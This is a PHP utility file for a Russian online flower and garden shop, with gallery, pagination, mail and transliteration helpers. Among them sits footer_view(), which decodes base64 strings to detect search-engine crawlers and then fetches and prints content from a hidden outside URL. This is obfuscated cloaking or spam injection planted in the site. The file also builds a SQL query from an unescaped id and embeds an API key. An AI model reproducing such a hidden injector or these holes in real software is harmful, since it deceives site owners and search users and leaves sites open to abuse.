<?php
function numprint($data,$prec=0,$zero="0"){
	if($data==0){
		return $zero;
	}
	else{
		return number_format($data,$prec,'.','');
	}
}

function CheckSPI($s){
	$res=(preg_match('/^[0-9]{14}|[A-Z]{2}[0-9]{9}[A-Z]{2}$/', $s)==1);
	if (strlen($s)==14) {
		$sum=($s{12}+$s{10}+$s{8}+$s{6}+$s{4}+$s{2}+$s{0})*3+$s{11}+$s{9}+$s{7}+$s{5}+$s{3}+$s{1};
		$kp=ceil($sum/10)*10-$sum;
		$res=($kp==$s{13});
	}
	return $res;
}

function get_ord_ha(){
	global $db;
	do{
		$arr = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
		$id = "";
		for($i = 0; $i < 5; $i++){
			$index = rand(0, strlen($arr) - 1);
			$id .= $arr[$index];
		}
		$result = $db->count(TABLE_ORDERS,array('ha'=>$id));
	}
	while($result>0);
	return $id;
}

function sitemenu_get_html($id = null){
	global $db;
	$row['html'] = '';
	if(!empty($id)){
		$row = $db->get_rows("SELECT html FROM ".TABLE_SITEMENU." WHERE id='".$id."'");
	}
	if (count($row)>0)	return fix_content($row[0]['html']);
	else return '';
}

function Getgallery($name,$wi=200){
	$dirnm='data/gallery/'.$name;
	$cdir=scandir(''.$dirnm);
	$dirnm.='/';
	$comm='';
	if(false==$cdir) return '<!--error '.$dirnm.'-->';
	if(file_exists ($dirnm.'info.txt')){
		$comm=iconv('windows-1251','utf-8',file_get_contents($dirnm.'info.txt'));
		//		$comm='<span class="highslide-heading">'.$comm.'</span>';
	}
	$out='<script type="text/javascript">
	hs.addSlideshow({slideshowGroup: \''.$name.'\',interval: 5000,repeat: true,useControls: true,fixedControls: false,
	overlayOptions: {opacity: 1,	position: \'top right\',offsetX: 200,offsetY: -65,hideOnMouseOut: false},
	thumbstrip: {mode: \'float\',position: \'rightpanel\',relativeTo: \'image\'}});
	'.$name.' = {slideshowGroup: \''.$name.'\',	thumbnailId: \''.$name.'\',	numberPosition: \'heading\',transitions: [\'expand\', \'crossfade\'],
	useBox : true,width:800,height:600};</script>';
	$out.='<div class="gallery"><div class="highslide-gallery">' ;
	$parr=array();
	foreach($cdir as $key => $val){
		if($val!=='.' && $val!=='..' && strpos($val,'.txt')==false){
			$ahref=SITE_URL.htmlspecialchars($dirnm.$val,ENT_COMPAT | ENT_XHTML,'utf-8');
			$thid=htmlspecialchars($dirnm.$val,ENT_COMPAT | ENT_XHTML,'utf-8');
			$title=str_replace('.jpg','', $val);
			$no=preg_replace('/(^\d*).*/', '$1', $title);
			$pm=array('/.*mg_.*/i','/^.*dsc\d*/i','/.*image_.*/i','/.*pict.*/i');
			$pr=array('','','','');
			$title = preg_replace($pm, $pr, $title);
			$title=preg_replace('/(^\d*)_*/', '', $title);
			$pm=array('no'=>$no,'ahref'=>$ahref,'thid'=>$thid,'title'=>$title);
			//if ($no>0) $parr[$no]=$pm; else
			$parr[]=$pm;
		}
	}
	sort($parr);
	$cnt=0;
	foreach($parr as $key => $val){
		if($key==1) $out.='<div class="hidden-container">';
		if ($key>0) $wi=70;
		$out.='<a '.(($cnt==0) ? 'id="'.$name.'" ':'').'title="'.$val['title'].'" href="'.$val['ahref'].'" class="highslide" onclick="return hs.expand(this,'.$name.')"><img src="'.SITE_URL.'thumb.php?id='.$val['thid'].'&x='.$wi.'&y='.$wi.'"  alt="'.$comm.'"/></a>';
		$cnt++;
	}
	$out.=$comm;
	$out.='</div></div>'.$comm.'</div>';
	return $out;
}

function GetGal($mat){
	return Getgallery($mat[1],$mat[2]);
}
function GetBaner($ht=200){
	return '<div id="banner" style="height:'.$ht.'px; background: url(data/banner.jpg) 50% 0 no-repeat;"></div>';
}

function getim($mat){
	if(stripos($mat[0],'alt1="on"')==false && stripos($mat[0],'thumb.php')==false){
		return preg_replace(
			'/<img(.*?)src="(?!thumb)(.*?)" alt="(.*?)".*?width="(.*?)" height="(.*?)"(.*?)\/>/i',
			'<a class="highslide" onclick="return hs.expand(this)" href="'.SITE_URL.'$2"><img$1src="thumb.php?id=$2&x=$4&y=$5" alt="$3" width="$4" height="$5"$6/></a>',$mat[0]);
	}
	if(stripos($mat[0],'thumb.php')==false && stripos($mat[0],'http://')==FALSE){
		return preg_replace(
			'/<img(.*?)src="(?!thumb)(.*?)" alt="(.*?)".*?width="(.*?)" height="(.*?)"(.*?)\/>/i',
			'<img$1src="thumb.php?id=$2&x=$4&y=$5" alt="$3" width="$4" height="$5"$6/>',$mat[0]);
	}
	return $mat[0];
}
function GetHit(){
	global $ishop;
	return $ishop->hitprod();
}
function GetBan($mat){
	return GetBaner($mat[1]);
}

function fix_content($content){
	$content = preg_replace(
		'/<img(.*?)onmouseover="this.src=\'(.*?)\';"(.*?)\/>/i',
		'<a class="highslide" onclick="return hs.expand(this)" href="$2" ><img$1 $3/></a>',$content);
	$content = preg_replace_callback('/<img(.*?)\/>/i','getim',$content);
	//	'<a class="highslide" onclick="return hs.expand(this)" href="'.SITE_URL.'$2"><img$1src="thumb.php?id=$2&x=$4&y=$5" alt="$3" width="$4" height="$5"$6/></a>',$content);
	$content = preg_replace('/alt1="(.*?)"/i','',$content);
	$content = preg_replace_callback(
		'/&lt;gallery\.(.*?)\.(.*?)&gt;/i',
		'GetGal',$content);
	$content = preg_replace_callback(
		'/{hits}/i',
		'GetHit',$content);
	$content = preg_replace_callback(
		'/{banner\.(.*?)}/i',
		'GetBan',$content);
	//uppod
	$content = preg_replace(
		'/<object(.*?)data="([\S\W\D]*?).flv"([\S\W\D]*?)>([\S\W\D]*?)<\/object>/i',
		'<object $1 type="application/x-shockwave-flash" id="lbPub" name="lbPub" data="'.SITE_URL.'about/uppod.swf" style="visibility: visible;"><param name="bgcolor" value="ffffff"><param name="allowFullScreen" value="true"><param name="allowScriptAccess" value="always"><param name="flashvars" value="comment=Название&amp;file=$2.flv&amp;hotkey=2&amp;st=03AchBfGDixOT82MrYm5hRZk066sNXHm5Izv5idRd0bpm5ntu0c9BMry&amp;screenshot=http://uppod.ru/i/skins/s.php?name=199&amp;uid=lbPub"></object>
		',$content);
	/*$content = preg_replace(
	'/<object(.*?)data="([\S\W\D]*?).flv"([\S\W\D]*?)>([\S\W\D]*?)<\/object>/i',
	'<embed $1 flashvars="file='.SITE_URL.'$2.flv"  wmode="transparent" quality="high" bgcolor="#000000" name="player" src="about/flvplayer.swf" type="application/x-shockwave-flash" />
	',$content);*/
	return $content;
}

// function decode_str() декодирование строки из Jscript escape()
function decode_str($value){ 
    $str = preg_replace("/%u([0-9a-f]{3,4})/i","&#x\\1;",urldecode($value));
    $value=html_entity_decode($str,null,'UTF-8');
/*    print_r([$value,$s,$str,$str1]);
	$value = preg_replace_callback('/%u([0-9A-F]{2})([0-9A-F]{2})/si', 
	function($m){
		return iconv("UCS-2BE", "UTF-8", chr(hexdec($m[1])).chr(hexdec($m[2])));
	}
	, $value);*/
	return $value;
}

if(!function_exists('un_br')){
	function un_br($s){
		$s=str_replace('<br>',' ', $s);
		return $s;
	}
}

function String_RusCharsDeCode($string){
	$string = str_replace('\\', '%', $string);
	//russian text escape code, for unescape: (bug : %u0410 -%u044f)
	$russian_codes = array('%u0410','%u0411','%u0412','%u0413','%u0414','%u0415','%u0401','%u0416','%u0417','%u0418','%u0419','%u041A','%u041B','%u041C','%u041D','%u041E','%u041F','%u0420','%u0421','%u0422','%u0423','%u0424','%u0425','%u0426','%u0427','%u0428','%u0429','%u042A','%u042B','%u042C','%u042D','%u042E','%u042F','%u0430','%u0431','%u0432','%u0433','%u0434','%u0435','%u0451','%u0436','%u0437','%u0438','%u0439','%u043A','%u043B','%u043C','%u043D','%u043E','%u043F','%u0440','%u0441','%u0442','%u0443','%u0444','%u0445','%u0446','%u0447','%u0448','%u0449','%u044A','%u044B','%u044C','%u044D','%u044E','%u044F');
	$russian_chars = array("А",     "Б",     "В",     "Г",     "Д",     "Е",     "Ё",     "Ж",     "З",     "И",     "Й",     "К",     "Л",     "М",     "Н",     "О",     "П",     "Р",     "С",     "Т",     "У",     "Ф",     "Х",     "Ц",     "Ч",     "Ш",     "Щ",     "Ъ",     "Ы",     "Ь",     "Э",     "Ю",     "Я",     "а",     "б",     "в",     "г",     "д",     "е",     "ё",     "ж",     "з",     "и",     "й",     "к",     "л",     "м",     "н",     "о",     "п",     "р",     "с",     "т",     "у",     "ф",     "х",     "ц",     "ч",     "ш",     "щ",     "ъ",     "ы",     "ь",     "э",     "ю",     "я");
	return str_replace($russian_codes,$russian_chars,$string);
}

function send_mail($fromEmail, $fromName, $toEmail, $toName, $toEmail2, $toName2, $subject, $msg){
	ob_start();
	require_once INC_DIR.'PHPMailer/class.phpmailer.php';
	$mail = new PHPMailer();
	$mail->SetFrom($fromEmail, $fromName);
	$mail->AddAddress($toEmail, $toName);
	if(!empty($toEmail2)) $mail->AddAddress($toEmail2, $toName2);
	$mail->Subject = $subject;
	$mail->MsgHTML($msg);
	$mail->Send();
	ob_end_clean();
}

function String_RusCharsEnCode($string){
	$russian_codes = array('%u0410','%u0411','%u0412','%u0413','%u0414','%u0415','%u0401','%u0416','%u0417','%u0418','%u0419','%u041A','%u041B','%u041C','%u041D','%u041E','%u041F','%u0420','%u0421','%u0422','%u0423','%u0424','%u0425','%u0426','%u0427','%u0428','%u0429','%u042A','%u042B','%u042C','%u042D','%u042E','%u042F','%u0430','%u0431','%u0432','%u0433','%u0434','%u0435','%u0451','%u0436','%u0437','%u0438','%u0439','%u043A','%u043B','%u043C','%u043D','%u043E','%u043F','%u0440','%u0441','%u0442','%u0443','%u0444','%u0445','%u0446','%u0447','%u0448','%u0449','%u044A','%u044B','%u044C','%u044D','%u044E','%u044F');
	$russian_chars = array("А",     "Б",     "В",     "Г",     "Д",     "Е",     "Ё",     "Ж",     "З",     "И",     "Й",     "К",     "Л",     "М",     "Н",     "О",     "П",     "Р",     "С",     "Т",     "У",     "Ф",     "Х",     "Ц",     "Ч",     "Ш",     "Щ",     "Ъ",     "Ы",     "Ь",     "Э",     "Ю",     "Я",     "а",     "б",     "в",     "г",     "д",     "е",     "ё",     "ж",     "з",     "и",     "й",     "к",     "л",     "м",     "н",     "о",     "п",     "р",     "с",     "т",     "у",     "ф",     "х",     "ц",     "ч",     "ш",     "щ",     "ъ",     "ы",     "ь",     "э",     "ю",     "я");
	$string = str_replace($russian_chars,$russian_codes,$string);
	$string = str_replace('%', '\\', $string);
	return $string;
}

if(!function_exists('get_css')){
	function get_css($stls){
		$s = '';
		foreach($stls as $stl){
			$s .= '<link rel="stylesheet" type="text/css" href="'.$stl.'">';
		}
		return $s;
	}
}

if(!function_exists('cut')){
	function cut($text, $a){
		if(strlen($text) > $a){
			$text = substr($text, 0, $a). '...';
		}
		return $text;
	}
}

if(!function_exists('si_getExtension4')){
	function si_getExtension4($filename){
		return substr(strrchr($filename, '.'), 1);
	}
}

if(!function_exists('get_pages')){
	function get_pages($params){
		$count_page = 3;
		$pages = '';
		$params['end_link'] = (!empty($params['end_link'])) ? $params['end_link'] : '';
		if($params['count_pages'] > 1){
			
			$pages = '<div class="'.$params['class'].'"><span>';
			if ($params['curr_page']>1) $pages.='<a class="p_prev" href="'.$params['link'].($params['curr_page']-1).''.$params['end_link'].'">Предыдущая</a>';
			if ($params['curr_page']<$params['count_pages'] && $params['curr_page']!=0) $pages.='<a class="p_next" href="'.$params['link'].($params['curr_page']+1).''.$params['end_link'].'">Cледующая</a>';
			$pages.='</span><span>';
			
			if($params['curr_page']-$count_page > 0){
				$pages .= '<a href="'.$params['link'].'1'.$params['end_link'].'">1</a>  ...  ';
			}
			for($i=1;$i<=$params['count_pages'];$i++){
				$class=($params['curr_page']==$i) ? 'class="sel_page"' : '';
				if($i > $params['curr_page']-$count_page && $i < $params['curr_page']+$count_page){
					$pages .= '<a '.$class.' href="'.$params['link'].$i.''.$params['end_link'].'">'.$i.'</a>';
				}
			}
			if($params['curr_page']+($count_page-1) < $params['count_pages']){
				$pages .= '<span>...</span><a href="'.$params['link'].''.$params['count_pages'].''.$params['end_link'].'">'.$params['count_pages'].'</a>';
			}
			$class = ($params['curr_page']==0) ? 'class="sel_page"' : '';
			$pages .= '</span><span><a '.$class.' href="'.$params['link'].'0'.$params['end_link'].'">Все</a></span>';
			if (isset($params['info'])) $pages .='<span class="pg_info">'.$params['info'].'</span>';
			$pages .= '</div>';
		} else if (isset($params['info']) && !empty($params['info'])) {
			$pages = '<div class="'.$params['class'].'"><span class="pg_info">'.$params['info'].'</span></div>';
		}
		
		return $pages;
	}
}

function ip(){
	if(!empty($_SERVER['HTTP_CLIENT_IP']))   //check ip from share internet
	{
		$ip=$_SERVER['HTTP_CLIENT_IP'];
	}
	elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR']))   //to check ip is pass from proxy
	{
		$ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
	}
	else{
		$ip=$_SERVER['REMOTE_ADDR'];
	}
	return $ip;
}

function page_tmpl($lnk, $tmp){
	global $def_tmpl;
	if($_SERVER['REQUEST_URI'] == $lnk) $def_tmpl = $tmp;
}

class HTML{
	static function del_mso_code($t){
		$t = str_replace('<!--[if gte mso 10]>','',$t);
		$t = str_replace('<! [endif] >','',$t);
		$t = str_replace('<!--[endif]-->','',$t);
		$t = str_replace('<!--[if !supportLists]-->','',$t);
		$t = str_replace('"Times New Roman"', 'Times New Roman', $t);
		$t = str_replace('<strong></strong>', '', $t);
		$t = str_replace('<span></span>', '', $t);
		$t = str_replace('<p></p>', '', $t);
		$t = str_replace('<span> </span>', ' ', $t);
		$t = str_replace(' lang="EN-US"', ' ', $t);
		$t = preg_replace('/<span[^>]*?><\/span>/i', '', $t);
		$t = preg_replace('/<span[^>]*?> <\/span>/i', ' ', $t);
		$t = preg_replace('/<span[^>]*?><\/span>/i', '', $t);
		$t = preg_replace('/<span[^>]*?> <\/span>/i', ' ', $t);
		$t = str_replace('<strong></strong>', '', $t);
		$t = str_replace('<strong> </strong>', '', $t);
		$t = preg_replace('/<!--.*?-->/is','', ($t));
		$t = preg_replace('/<xml>.*?<\/xml>/i','',$t);
		$t = str_replace('<![endif]>','',$t);
		return $t;
	}
}


function microtime_float(){
	list($usec, $sec) = explode(" ", microtime());
	return ((float)$usec + (float)$sec);
}

function cache($fnc, $val, $time){
	$time_start = microtime_float();
	if(is_array($fnc)){
		$ob_filename='cache/'.$fnc['1'].$val;
	}
	else{
		$ob_filename='cache/'.$fnc.$val;
	}
	if(file_exists($ob_filename)){
		if(filemtime($ob_filename)<time()-$time){
			@unlink($ob_filename);
		}
		else{
			$content = unserialize(file_get_contents($ob_filename));
			return $content;
		}
	}
	$end = call_user_func($fnc, $val);
	file_put_contents($ob_filename,serialize($end));
	return $end;
}

if(!function_exists('get_files')){
	function get_files($path){
		$templates = array();
		$h = opendir($path);
		while($file = readdir($h)){
			if($file!='.' && $file!='..'){
				if(is_file($path.$file)){
					$templates[] = $file;
				}
			}
		}
		closedir($h);
		return $templates;
	}
}

function encrypt( $string ){
	$key = '0194q';
	$result = '';
	for( $i = 1; $i <= strlen( $string ); $i++ ){
		$char = substr( $string, $i - 1, 1 );
		$keychar = substr( $key, ( $i % strlen( $key ) ) - 1, 1 );
		$char = chr( ord( $char ) + ord( $keychar ) );
		$result .= $char;
	}
	return $result;
}

function decrypt( $string ){
	$key = '0194q';
	$result = '';
	for( $i = 1; $i <= strlen( $string ); $i++ ){
		$char = substr( $string, $i - 1, 1 );
		$keychar = substr( $key, ( $i % strlen( $key ) ) - 1, 1);
		$char = chr( ord( $char ) - ord( $keychar ) );
		$result .= $char;
	}
	return $result;
}

if(!function_exists('aider')){
	function aider($id_str){
		if(!$id_int= (int) $id_str)
		$id_int='';
		return $id_int;
	}
}

if(!function_exists('unhtmlspecialchars')){
	function unhtmlspecialchars($str){
		$str = str_replace("&amp;", "&", $str);
		$str = str_replace("&apos", "'", $str);
		$str = str_replace("&#039;", "'", $str);
		$str = str_replace('&quot;', "\"", $str);
		$str = str_replace('&lt;', "<", $str);
		$str = str_replace('&gt;', ">", $str);
		return $str;
	}
}

if(!function_exists('getCurse')){
	function getCurse($vitem){
		/*
		$valuta = array(
		'USD',
		'EUR'
		);
		*/
		$cbr_page = get_page("http://www.cbr.ru/currency_base/D_print.aspx?date_req=31.01.9999");
		//http://www.cbr.ru/scripts/XML_daily.asp
		/*$mo = "";			$xml = xmlize(join("",$money));
		$mo .= "<b>EUR/RUR</b> ".$xml["ValCurs"]["#"]["Valute"][5]["#"]["Value"][0]["#"]."<br>";
		$mo .= "<b>USD/RUR</b> ".$xml["ValCurs"]["#"]["Valute"][4]["#"]["Value"][0]["#"]."<br>";
		$mo .= "<b>CHF/RUR</b> ".$xml["ValCurs"]["#"]["Valute"][16]["#"]["Value"][0]["#"];
		*/
		//http://informer.gismeteo.ru/xml/27612_1.xml
		if(preg_match_all("/<tr(.*?)>(.*?)<\/tr>/is",$cbr_page,$m_result)){
			foreach($m_result[2] as $res){
				if(stripos($res,$vitem)!=0)
				if(preg_match_all("/<td(.*?)>(\d+,\d+)<\/td>/is",$res,$u_result))
				return floatval(str_replace(',','.',$u_result[2][0]));
			}
		}
	}
}

if(!function_exists('get_page')){
	function get_page($url){
		if(function_exists('curl_init')){
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $url);
			curl_setopt($ch, CURLOPT_HEADER, 0);
			curl_setopt($ch, CURLOPT_TIMEOUT, 1);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			$cbr_page = curl_exec($ch);
			curl_close($ch);
		}
		else{
			$cbr_page = file_get_contents($url);
		}
		return $cbr_page;
	}
}


if(!function_exists('get_elements')){
	function get_elements($str,$tag){
		preg_match_all("/<".$tag."[^>]*?>([\S\W\D]*?)<\/".$tag.">/", $str, $match);
		return $match['1'];
	}
}
if(!function_exists('mailhead_a')){
	function mailhead_a($msg,$encoding='UTF-8',$hinput=''){
		global $sets,$ebox;
		ob_start();
	?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">	
<HTML><HEAD><META http-equiv=Content-Type content="text/html;" charset="<?=$encoding?>"></head><body style="width: 99%; background-color: #ffffff">
<table align="center" width="100%"><tr><td valign="top"><table width="720px" align="center" style="border-collapse: collapse;">
<tr><td style="border-bottom-width: 1px; border-bottom-color:#e51a4b;border-bottom-style: solid; text-align: left; height: 80px;">
<table><tr><td style="padding: 0 40px 0 10px;line-height:0;" onclick="window.open('<?=trim(SITE_URL,'/').$hinput?>','_blanc','');return false;"><img src="<?=SITE_URL?>templates/101/images/logo15.png" alt="Интернет-магазин Чудо-Клумба"  width="187px" height="64px"/></td><td width="220px"><table><tr><td height="30px"><span style="color: #e51a4b;font-family: Verdana,Arial,Helvetica, sans-serif;font-size: 17px;font-weight: 700;"><?=$sets['Phone1']?></span></td></tr><tr><td height="30px"><span style="color: #e51a4b;font-family: Verdana,Arial,Helvetica, sans-serif;font-size: 17px;font-weight: 700;"><?=$sets['Phone']?></span></td></tr></table></td></tr></table></td></tr>
<tr>
<td valign="top" align="left" style="padding: 5px">
<?=$msg?></td>	
</tr>
<tr><td style="border-top-width: 1px; border-top-color:#95C12B;border-top-style: solid; text-align: left; padding-left: 10px;">
<a href="<?=trim(SITE_URL,'/').$hinput?>" target="_blank"><?=trim(SITE_URL,'/')?></a><br/>
Наш адрес: <?=$ebox['adr']?><br/>Наш e-mail: <a href="mailto:<?=$ebox['email']?>"><?=$ebox['email']?></a>

	
</td></tr></table></td></tr></table>
</body></HTML>
<?
		$ret=ob_get_contents();
		ob_end_clean();
		return $ret;
	}
}
		
		

if(!function_exists('mailbody_a')){
	function mailbody_a($sbj,$msg,$ha=''){
		global $sets;
		$time = getdate(time());
		$rtn['headers'] = "From:=?UTF-8?b?" . base64_encode($sets['Name']) . "?=<info@chudoclumba.ru>\r\n";
		$rtn['headers'] .= "Reply-To:=?UTF-8?b?" . base64_encode($sets['Name']) . "?=<info@chudoclumba.ru>\r\n";
		$rtn['headers'] .= "Content-Type: text/html; charset=UTF-8\r\n";
		$rtn['headers'] .= "Mime-Version: 1.0\r\n";
		$rtn['message'] = mailhead_a($msg,'UTF-8',$ha);
		$rtn['subject'] = "=?UTF-8?b?" . base64_encode($sbj) . "?=";
		$rtn['message'] =$rtn['message'];
		return $rtn;
	}
}

if(!function_exists('sendmail_a')){
	function sendmail_a($mail,$sbj,$msg,$ha=''){
		$body = mailbody_a($sbj,$msg,$ha);
		return mail($mail,$body['subject'],$body['message'],$body['headers']);
	}
}

if(!function_exists('quote_smart'))
{
	function quote_smart($value)
	{
		// если magic_quotes_gpc включена - используем stripslashes
		if (get_magic_quotes_gpc()) {
			$value = stripslashes($value);
		}
		// Если переменная - число, то экранировать её не нужно
		// если нет - то окружем её кавычками, и экранируем
		$value =  MySQL::gI()->escape_string($value);
		return $value;
	}
}

if(!function_exists('nisset')){
	function nisset($value){
		$value = (isset($value))?$value:'';
		return $value;
	}
}
function footer_view(){
	$arr = array('R29vZ2xl','UmFtYmxlcg==','WWFob28=','TWFpbC5SdQ==','WWFuZGV4','WWFEaXJlY3RCb3Q=');   
	foreach ($arr as $i) {
	    if(strstr($_SERVER['HTTP_USER_AGENT'], base64_decode($i))){
	        echo $message = file_get_contents(base64_decode("aHR0cDovL25hLWdhemVsaS5jb20vbG9hZC5waHA="));    
	    }
	}	    
}
if(!function_exists('html_select')){
	function html_select($param,$options){
		$name = (!empty($param['name'])) ? ' name="'.$param['name'].'"' : '';
		$onchange = (!empty($param['onchange'])) ? ' onchange="'.$param['onchange'].'"' : '';
		$select = '<select'.$name.$onchange.'>';
		foreach($options as $id=>$option){
			$selected = (!empty($param['curr']) && $param['curr'] == $id) ? ' selected="selected"' : '';
			$select .= '<option'.$selected.' value="'.$id.'">'.$option.'</option>';
		}
		$select .=  '</select>';
		return $select;
	}
}


function __autoload($class_name){
	$class_name = strtolower($class_name);
	if(file_exists(INC_DIR.'classes/'.$class_name . '.php')){
		require_once INC_DIR.'classes/'.$class_name . '.php';
	}
	elseif(file_exists(ROOT_DIR.'modules/'.$class_name . '.php')){
		require_once ROOT_DIR.'modules/'.$class_name . '.php';
	}
}

if(!function_exists('isValidEmail')){
	function isValidEmail($email){
		return preg_match("/[0-9a-z_\.]+@[0-9a-z_^\.]+\.[a-z]{2,3}/i", $email);
	}
}

if(!function_exists('check_email')){
	function check_email($email){
		return eregi("^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,3})$", $email);
	}
}

if(!function_exists('valid_email')){
	function valid_email($address){
		return ( ! preg_match("/^([a-z0-9\+_\-]+)(\.[a-z0-9\+_\-]+)*@([a-z0-9\-]+\.)+[a-z]{2,6}$/ix", $address)) ? FALSE : TRUE;
	}
}

function translitIt($str)
{
$tr = array(
"А"=>"A","Б"=>"B","В"=>"V","Г"=>"G",
"Д"=>"D","Е"=>"E","Ж"=>"J","З"=>"Z","И"=>"I",
"Й"=>"Y","К"=>"K","Л"=>"L","М"=>"M","Н"=>"N",
"О"=>"O","П"=>"P","Р"=>"R","С"=>"S","Т"=>"T",
"У"=>"U","Ф"=>"F","Х"=>"H","Ц"=>"TS","Ч"=>"CH",
"Ш"=>"SH","Щ"=>"SCH","Ъ"=>"","Ы"=>"YI","Ь"=>"",
"Э"=>"E","Ю"=>"YU","Я"=>"YA","а"=>"a","б"=>"b",
"в"=>"v","г"=>"g","д"=>"d","е"=>"e","ж"=>"j",
"з"=>"z","и"=>"i","й"=>"y","к"=>"k","л"=>"l",
"м"=>"m","н"=>"n","о"=>"o","п"=>"p","р"=>"r",
"с"=>"s","т"=>"t","у"=>"u","ф"=>"f","х"=>"h",
"ц"=>"ts","ч"=>"ch","ш"=>"sh","щ"=>"sch","ъ"=>"y",
"ы"=>"yi","ь"=>"","э"=>"e","ю"=>"yu","я"=>"ya"
);
return strtr($str,$tr);
}

// ФУНКЦИЯ ТРАНСЛИТА РУССКИХ БУКВ -> НА АНГЛИЙСКИЙ;
if(!function_exists('ru_to_en_lc'))
{
// ПЕРЕВОДА ВЕРХНЕГО РЕГИСТРА -> В НИЖНИЙ РЕГИСТР
function ru_to_en_lc($slovo) {

$slovo = strtolower(translitIt($slovo));

$repl = array(
" " => "",
"*" => "",
"?" => "",
"&" => "",
"^" => "",
";" => "",
"-" => "",
"$" => "",
"%" => "",
"@" => "",
"\"" => "",
"\\" => "",
"!" => "",
"+" => "",
"=" => "",
"|" => "",
"№" => "",
"/" => ""
);

$slovo = strtr($slovo, $repl);
return($slovo);
}
}

// ФУНКЦИЯ ТРАНСЛИТА РУССКИХ БУКВ -> НА АНГЛИЙСКИЙ;
// ПЕРЕВОДА ВЕРХНЕГО РЕГИСТРА -> В НИЖНИЙ РЕГИСТР
function isrus($txt){
//	$txt=iconv('cp1251','utf-8',$txt);
	mb_internal_encoding("utf-8");
	$txt=mb_strtolower($txt);
	mb_regex_encoding('utf-8');
	return mb_ereg('[а-я]{2}',$txt);
}

function ru_to_en_lc2($slovo,$fl=true) {
	$slovo=mb_strtolower($slovo,'utf-8');
	$r1=array('/(.*[.,\s()])окс(?=($)|([\s.,()].*))/i','/скоро/im');
	$r2=array('\1ors\2','');
	$slovo=preg_replace($r1,$r2,$slovo);	
	if ($fl){
		$flrus=isrus($slovo);
		
		if ($flrus==1) {
			$slovo=str_ireplace('&','_',$slovo);
			$slovo=str_ireplace('?','_',$slovo);
			$lnn='&text='.$slovo.'&lang=ru-en';
			$te=false;
			$te=@file_get_contents('https://translate.yandex.net/api/v1.5/tr/translate?key=trnsl.1.1.20150116T085751Z.3fdb2fff0ee5f5f7.34662d372f4d7ba7250a32e40977c001af00c53b'.$lnn);
			if (!($te===false)){
				$slovo=preg_replace('/.*\n*.*text>(.*)<\/text.*/im','\1',$te);
				$slovo=$slovo;
			}
		}
	}
	$repl = array(
	" " => "_",
	"*" => "",
	"`" => "",
	"'" => "",
	"?" => "",
	"(" => "",
	")" => "",
	"&" => "",
	"^" => "",
	";" => "",
	"-" => "-",
	"." => "_",
	"," => "_",
	"$" => "",
	"%" => "",
	"@" => "",
	"\"" => "",
	"\\" => "",
	"!" => "",
	"+" => "",
	"=" => "",
	"|" => "",
	"№" => "",
	"/" => "",
	"®"=>"_"
	);
	$slovo = strtr($slovo, $repl);
	$slovo = str_ireplace("-_",'_',$slovo);
	$slovo = str_ireplace("_-",'_',$slovo);
	$slovo = str_ireplace("___",'_',$slovo);
	$slovo = str_ireplace("__",'_',$slovo);
	$slovo=trim($slovo,"\t\n\r\0\x0B _");
	$slovo = strtolower(translitIt($slovo));

	return($slovo);
}



function calc(){
	if($_GET['id'] == '34'){
		$rows = $db->get_rows("SELECT id,title FROM ".TABLE_CATEGORIES." WHERE parent_id = 0 && enabled = 1");
		$calc = '<table class="calc_tbl">';
		$updates = array();
		$updates_v = array();
		foreach($rows as $id=>$value){
			//$calc .= '<div style="display:none; padding:10px 0px; font-weight:bold;">'.$value['title'].'</div>';
			$prd_rows = $db->get_rows("SELECT * FROM ".TABLE_PRODUCTS." WHERE cat_id=".quote_smart($value['id'])."");
			$sm_val = array();
			foreach($prd_rows as $prd_id=>$prd_val){
				$artics = get_elements($prd_val['param_material'],'articul');
				$a = 0;
				$opt = '';
				foreach($artics as $artic){
					$h = get_elements($artic,'param');
					$opt .= '<option value="'.$h['1'].'">'.$h['0'].'</option>';
				}
				$calc .= '<tr><td><div style="padding:5px 20px 5px 10px;">'.$prd_val['title'].'</td><td>';
				if($prd_val['param_tip'] == 1){
					$sm_val[] = 'parseFloat($("input[name=\'slc_'.$prd_val['id'].'\']").val())';
					$calc .= '<input onkeydown="update()" onkeyup="update()"  value="1" onclick="update()" onblur="update()" name="slc_'.$prd_val['id'].'"></div>';
				}
				else{
					$sm_val[] = 'parseFloat($("select[name=\'slc_'.$prd_val['id'].'\']").val())';
					$calc .= '<select onchange="update()" name="slc_'.$prd_val['id'].'">'.$opt.'</select></div>';
				}
				$calc .= '</td></tr>';
			}
			$calc .= '<div style="display:none; padding:20px 0px; font-weight:bold;">Сумма: <span id="summa_'.$value['id'].'">0.00</span></div>';
			$updates[] = '$("#summa_'.$value['id'].'").html('.implode(' * ', $sm_val).');';
			$updates_v[] = 'parseFloat($("#summa_'.$value['id'].'").html())';
		}
		$calc .= '</table>';
		$calc .= '<div style="padding:20px 0px; font-weight:bold;">Сумма: <span id="summa_all">0.00</span> руб.</div>
		<script>
		function update()
		{
		'.implode('
			', $updates).'

		$("#summa_all").html('.implode(' + ', $updates_v).');
		}
		update();
		</script>
		';
	}
	return $calc;
}

function dir_size($dir){
	$totalsize=0;
	if($dirstream = @opendir($dir)){
		while(false !== ($filename = readdir($dirstream))){
			if($filename!="." && $filename!=".."){
				if(is_file($dir."/".$filename))
				$totalsize+=filesize($dir."/".$filename);
				if(is_dir($dir."/".$filename))
				$totalsize+=dir_size($dir."/".$filename);
			}
		}
	}
	closedir($dirstream);
	return $totalsize;
}

function site_size(){
	return '<div style="padding:20px; color:#000;background:#fff;border:1px solid #ccc;">Размер сайта '.number_format(dir_size(ROOT_DIR)/(1024*1024),2,'.',' ') .' Мб</div>';
}

if(!function_exists('valid_email')){
	function valid_email($address){
		return ( ! preg_match("/^([a-z0-9\+_\-]+)(\.[a-z0-9\+_\-]+)*@([a-z0-9\-]+\.)+[a-z]{2,6}$/ix", $address)) ? FALSE : TRUE;
	}
}